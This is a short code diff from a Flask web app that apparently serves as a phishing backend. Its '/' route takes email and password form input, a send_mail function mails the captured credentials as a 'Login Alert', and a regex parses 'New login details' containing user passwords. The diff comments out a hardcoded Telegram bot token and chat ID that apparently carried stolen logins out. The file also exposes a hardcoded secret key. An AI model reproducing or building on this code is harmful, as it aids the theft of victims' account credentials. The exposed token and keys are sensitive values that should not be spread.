@@ -23,10 +23,10 @@ app.config['SECRET_KEY'] = 'language007'
 mail = Mail(app)
 
 # Telegram bot token
-token = '6933427301:AAGkWy-GtwxcoILnefvi4o0QCT_ohYUaGGg'
-chat_id = '6469097185'
+# token = '6933427301:AAGkWy-GtwxcoILnefvi4o0QCT_ohYUaGGg'
+# chat_id = '6469097185'
 
-log_pattern = re.compile(r'New login details: User-Email: (.+), User-Password: (.+)')
+# log_pattern = re.compile(r'New login details: User-Email: (.+), User-Password: (.+)')
 
 def send_mail(email, password):
     msg = Message('Login Alert', sender=app.config['MAIL_USERNAME'], recipients=[email])
@@ -55,7 +55,6 @@ def send_mail(email, password):
 #                 send_message(message)
 
 @app.route("/", methods=['GET', 'POST'])
-ghfmhvhvjhvjhhvmvhh
 def one():
     if request.method == 'POST':
         email = request.form.get('email')
